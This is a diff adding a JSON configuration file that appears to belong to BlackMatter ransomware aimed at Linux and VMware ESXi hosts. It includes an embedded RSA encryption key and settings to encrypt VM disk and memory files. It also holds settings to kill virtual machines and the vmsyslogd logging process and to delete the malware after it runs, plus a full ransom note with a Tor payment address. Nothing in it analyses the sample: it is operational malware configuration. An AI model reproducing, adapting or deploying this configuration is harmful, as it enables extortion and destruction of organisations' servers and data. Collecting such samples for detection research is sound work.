@@ -1,0 +1,31 @@
+{
+    "rsa": "MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAunSLWGARE1EPJlfmkCK7O08Uw\/oXRc9PLJsPPJeASXP5LhzVQlNLNEdQp9CxRKJYLhHAbFGEENowEG9SuMHZ9BrPO44EcN49XJ0YcrOOCWUk6F515XahMSxzviUiR6LwzMSGhvIcD2Yte9612G\/Wlub\/G+3jJnR3\/gbCF3i09\/tJhJvqaVILvbV\/NHFo\/5X6ai4HEgnCEMIc8HP2sXHBvjgGeze1pgIoPDWqxF20pK6\/OihnrUpii81TOGuM\/Dp8if2uGdlGi0lB\/2KZo2YFXgRWCbwD8rpeM2YEzQQ9M3GFZyWOAbDywAsTknG6G4Ae1uJKKHF9cqYG1J4ZTID5xvl2zLieSqZv4pZ7vFCW2JZ24bZmv0TylDMiE9csrskS594B41JgWqgQWt8iqLew8SNYxo5IBoStALr2XqmSC+tkcwq1KKaVH7MSGqtHjcJVWT7wPgjdka3DcYfCOGFkOK4j01u1AL\/T0f7evWSDslrOQ1jxyYs7IzT2voq3EQuY03b+o6OhZU5r92TDWs6PEHrYeXL+m3yIWAn0Hqr8zJdKGrr+QaCsJbDrCJd66kJ11bVPJlMTL0qFWgmyOuDbVmA+LAwkW5MHD7AbgRi3xshIlBr5kwBvlOUxndA9VprYbouZnjtRIEti+dUzC15mOHxTT9kKtgtXx\/dA3v7g38cCAQM=",
+    "remove-self": "true",
+    "worker-concurrency": "0",
+    "disk": {
+        "enable": "true",
+        "type": "multiple",
+        "dark-size": "256",
+        "white-size": "30720",
+        "min-size": "0",
+        "extension-list": "vmdk,vmem,vswp,log"
+    },
+    "message": {
+        "enable": "true",
+        "file-name": "ReadMe.txt",
+        "file-content": "      ~+                                       \n               *       +\n         '     BLACK        |\n     ()    .-.,='``'=.    - o -         \n           '=\/_       \\     |           \n        *   |  '=._    |                \n             \\     `=.\/`,        '    \n          .   '=.__.=' `='      *\n +             Matter        +\n      O      *        '       .\n\n>>> What happens?\n   Your linux hosts are encrypted, and currently not operational. \n   We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data.\n   \n>>> What guarantees? \n   We are not a politically motivated group and we do not need anything other than your money. \n   If you pay, we will provide you the programs for decryption and we will delete your data. \n   If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. \n   We always keep our promises.\n\n>> How to contact with us? \n   1. Download and install TOR Browser (https:\/\/www.torproject.org\/).\n   2. Open http:\/\/supp24yy6a66hwszu2piygicgwzdtbwftb76htfj7vnip3getgqnzxid.onion\/7NT6LXKC1XQHW5039BLOV\n\n>> Warning! Recovery recommendations.  \n   Do not DELETE or MODIFY any files, it can lead to recovery problems!"
+    },
+    "kill-vm": {
+        "enable": "true",
+        "ignore-list": [
+            "VMware vCenter",
+            "VMware-VirtualSAN-Witness"
+        ]
+    },
+    "kill-process": {
+        "enable": "true",
+        "list": [
+            "vmsyslogd"
+        ]
+    }
+}
